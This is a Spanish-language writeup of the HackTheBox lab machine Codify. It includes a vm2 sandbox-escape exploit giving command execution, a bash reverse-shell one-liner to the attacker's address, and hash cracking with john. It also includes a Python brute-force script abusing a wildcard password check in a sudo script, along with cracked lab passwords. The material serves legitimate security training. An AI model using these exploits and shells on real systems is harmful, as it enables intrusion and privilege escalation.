---
title: "Codify"
date: 2025-05-29 16:41:27 +0200
categories: writeups HackTheBox
tags: cve python scripting rce criptografía infoleak máquina wildcard linux sandboxescape node
description: Writeup de la máquina Codify de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228233404.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.239`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.239 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22, 80 y 3000**.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228233502.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80,3000 -sCV 10.10.11.239 -oN targeted
```

Observamos que en la captura de **Nmap** no encontramos nada interesante más allá de lo que ya sabemos.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228233516.png>)
____
## Explotación

Observamos que al intentar acceder a la página web nos redirige directamente a **https\://codify.htb**.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228233714.png>)

Para solucionar este problema debemos aplicar **Virtual Hosting** para ello abrimos el **/etc/hosts** y añadiremos la siguiente línea: `10.10.11.239  codify.htb`. Ahora si intentamos acceder a la página web veremos que nos funciona perfectamente:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228233917.png>)

Si leemos la siguiente línea podremos saber de que trata la web: _This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time_. Básicamente la web cuenta con un editor de código integrado (sandbox) el cual nos permite correr código en **Node.js**.

Buscaremos en internet por vulnerabilidades que nos permitan ejecutar código en una sandobox de **node.js**, encontraremos diferentes enlaces aunque el que nos interesa es el último.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228234234.png>)

La siguiente página nos proporcionará el siguiente código el cual nos permitirá ejecutar código remotamente.

```node
// Import the VM class from the vm2 module to create an isolated virtual environment.
const { VM } = require("vm2");
// Initialize a new VM instance.
const vm = new VM();

// Define the malicious JavaScript code to be executed within the VM.
const code = `
  // Create a new Error object.
  const err = new Error();
  // Overriding the 'name' property of the error object with a Proxy to intercept calls.
  err.name = {
    toString: new Proxy(() => "", { // Use a Proxy to intercept the toString method call.
      apply(target, thiz, args) { // The 'apply' trap is invoked when the proxy function is called.
        // Escalate privileges and access the process object from the host environment.
        const process = args.constructor.constructor("return process")();
        // Execute a system command using 'execSync' from the child_process module and throw its output.
        throw process.mainModule.require("child_process").execSync("id").toString();
      },
    }),
  };
  try {
    // Attempt to access the 'stack' property, which triggers the toString conversion of 'name'.
    err.stack;
  } catch (stdout) {
    // Output the result from the caught exception.
    stdout;
  }
`;

// Execute the defined malicious code in the VM and log the output. Expected output is "hacked".
console.log(vm.run(code)); // -> hacked
```

Veremos que al ejecutar el anterior código logramos tener **RCE** por lo que en este punto lo que haremos será enviarnos una **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229000233.png>)

> En el caso de que no encontremos ningún exploit buscando por internet, nos volveremos a dirigir a la página de **/about** y veremos que nos hablan sobre la librería **vm2** la cual es muy usada en está sandbox para proporcionar seguridad 😀.
> 
> ![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228235900.png>)
> 
> Si buscamos exploits relacionados con dicha librería en internet nos daremos cuenta que existen bastantes CVEs conocidos (**5**) que nos funcionarán para obtener una **RCE**. Solo hemos visto uno de ellos ya que son casi todos iguales, es posible que alguno de ellos no muestre el output aunque realmente si que se estará ejecutando dicho comando.
> 
> ![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241228234603.png>)

Para enviarnos la **Reverse Shell** en primer nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y gracias a la ejecución remota de comandos (**RCE**) que hemos logrado en la página web ejecutaremos el típico one liner de bash (`bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'`) y observaremos que inmediatamente recibiremos la **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229122724.png>)
___
## Escala de privilegios

Una vez hemos recibido la **Reverse Shell** debemos de aplicar un **Tratamiento de la TTY** para operar desde una consola más cómoda.

Tras tener una consola interactiva gracias al **Tratamiento de la TTY** procederemos a enumerar el sistema ya que necesitamos pivotar al usuario **joshua**, si nos dirigimos al directorio **/var/www** veremos que existen **3** sitios virtuales distintos:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229122935.png>)

Si entramos dentro del directorio **/contact** veremos que hay un archivo **.db** el cual

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229123201.png>)

Dicho archivo lo podemos abrirlo tal y como se muestra en la captura de pantalla (`sqlite3 tickets.db`), además en su interior encontraremos el **hash** perteneciente al usuario **joshua**:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229123341.png>)

Nos copiaremos el **hash** en un archivo. Destacar podríamos usar la herramienta **hashcat** pero por comodidad estaremos usando **johntheripper** de la siguiente forma:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Observamos como nos crackea el **hash** rápidamente por lo que probaremos a autenticarnos como **joshua** con dicha contraseña crackeada (**spongebob1**):

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229123835.png>)

Podemos autenticarnos de dos formas con `su` o con `ssh`, en este caso me autenticaré por `ssh` de la siguiente forma:

```bash
ssh joshua@10.10.11.239
```

> Destacar que para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**) debemos de hacer un `export TERM=xterm`.

Una vez que nos hemos convertido en el usuario **joshua** debemos convertirnos en el usuario **root** para ello miraremos por permisos de **Sudoers** con `sudo -l` y nos daremos cuenta que podemos ejecutar un script de bash como el usuario **root**:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229124542.png>)

El contenido del script es el siguiente:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229124732.png>)

Cuando ejecutamos el script vemos que nos pide la contraseña para la base de datos y así poder hacer el backup de ella, pero como no tenemos dicha contraseña nos sacará del script con este error:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229125237.png>)

Tras estar mucho tiempo mirando como explotar este script tuve que mirar el writeup y finalmente la solución fue introducir como contraseña una wildcard, es decir un **asterisco** (**\***) y veremos como ahora si que no nos da error:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229125313.png>)
### Forma intencionada (procesos)

En primer lugar veremos la forma intencionada de convertirnos en **root**, volveremos a mirar el código del script y nos daremos cuenta que hay un comando en la cual se introduce la contraseña de la base de datos en texto plano.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229125710.png>)

Por lo que en este punto lo que haremos será **Transferirnos** la herramienta **pspy** a nuestra máquina víctima, le daremos permisos de ejecución (`chmod +x /tmp/pspy`) y lo ejecutaremos (`/tmp/pspy`). 

Finalmente ejecutaremos de nuevo el script sobre el que tenemos permiso de **Sudoers**, como contraseña le volveremos a pasar el **asterisco** (**\***) y nos daremos cuenta que podemos ver la contraseña en el **pspy** ya que como bien habíamos visto se está pasando en texto plano:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229130137.png>)
### Forma no intencionada (fuerza bruta)

La forma no intencionada de encontrar la contraseña es a través de un script en python que hemos de crearnos el cual se encargue de realizar **fuerza bruta** para encontrar dicha contraseña.

En primer lugar veremos que podemos pasarle la contraseña gracias a una **pipeline** lo cual nos facilitará a la hora de crearnos el script en python.

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229132215.png>)

El exploit se basa en aprovecharse de la wildcard para ir descubriendo la contraseña, es decir tal y como vemos en la siguiente captura de pantalla:

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229132422.png>)

Una vez tenemos lo anterior claro podemos proceder con la creación del script, el cual finalmente quedará así:

```python
#!/usr/bin/env python3

import subprocess
import string
from pwn import *

name_script = "script"
password = ""
password_length = None

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

def get_password_length():
    global password_length

    p = log.progress("Password Length")

    password_iterator = "?"

    while True:
        result = subprocess.run([f"echo '{password_iterator}' | ./{name_script}.sh"], shell=True, text=True, capture_output=True)

        password_iterator += "?"

        if result.stdout.strip() == "Password confirmed!":
            password_length = len(password_iterator)
            p.success(password_length)
            break

def get_password():
    global name_script, password, chars, password_length

    p = log.progress("Guessing Password")

    for i in range(0, password_length):
        for char in chars:
            password_check = password + char
            result = subprocess.run([f"echo '{password_check}*' | ./{name_script}.sh"], shell=True, text=True, capture_output=True)

            if result.stdout.strip() == "Password confirmed!":
                password += char
                p.status(password)
    p.success(password)

if __name__ == '__main__':
    get_password_length()
    get_password()
```

Observamos que al ejecutar el script creado obtendremos la misma contraseña pero esta vez a través de fuerza bruta:

![python\_script.gif](<../../images/python_script.gif>)

Por último nos convertiremos satisfactoriamente en el usuario **root** con la contraseña encontrada (**kljh12k3jhaskjh12kjh3**):

![](<../assets/images/posts/2025-05-29-codify/Pasted image 20241229130428.png>)